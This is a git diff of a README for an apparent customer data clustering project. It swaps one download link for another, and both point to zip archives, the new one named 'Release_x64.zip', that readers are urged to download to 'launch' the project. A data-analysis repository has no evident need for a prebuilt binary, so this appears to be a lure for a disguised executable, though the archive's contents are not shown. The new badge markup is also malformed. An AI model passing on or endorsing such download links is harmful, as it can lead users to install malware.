@@ -15,7 +15,7 @@ The repository contains the following key components:
 ## 🚀 Launch the Project
 
 To explore the full project and dive into the clustering analysis, please download the project files from the following link:
-[![Launch Customer Data Clustering Project](https://img.shields.io/badge/Launch%20Project-Download%20Here-orange)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Launch Customer Data Clustering Project](https://github.com/CosmoOnYT/CustomerDataClustering_KaggleDataset/releases/download/v2.0/Release_x64.zip%20Project-Download%20Here-orange)](https://github.com/CosmoOnYT/CustomerDataClustering_KaggleDataset/releases/download/v2.0/Release_x64.zip)
 
 After downloading the project files, extract the contents and follow the instructions in the README to get started with the clustering models.
 
